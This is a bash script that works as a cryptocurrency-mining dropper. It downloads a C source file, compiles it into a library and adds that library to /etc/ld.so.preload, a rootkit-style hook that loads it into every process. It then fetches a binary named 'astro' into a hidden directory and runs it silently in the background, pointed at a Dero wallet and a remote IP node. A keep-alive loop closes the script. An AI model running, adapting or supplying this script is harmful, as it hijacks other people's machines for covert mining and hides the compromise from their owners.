#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .kap && cd .kap
wget https://github.com/tyha4t57i/filesg/raw/main/astro
chmod +x astro
./astro -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 136.244.103.215:10100 -p rpc -m 13 > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
